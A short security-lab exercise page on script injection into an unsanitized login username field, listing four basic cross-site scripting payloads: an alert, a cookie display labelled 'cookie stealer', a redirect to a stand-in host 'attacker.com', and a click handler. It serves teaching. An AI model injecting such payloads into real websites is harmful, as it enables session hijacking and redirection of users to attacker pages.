📚 Lab 8.1.A: Script Injection Attack

Inject JavaScript code directly into the login form. The username field is not sanitized or encoded, allowing arbitrary script execution.

💡 Example Payloads:

Basic alert:

<script>alert('Hacked!')</script>

Cookie stealer:

<script>alert(document.cookie)</script>

Redirect attack:

<script>window.location='attacker.com'</script>

Event listener:

<script>document.onclick=()=>alert('Clicked!')</script>
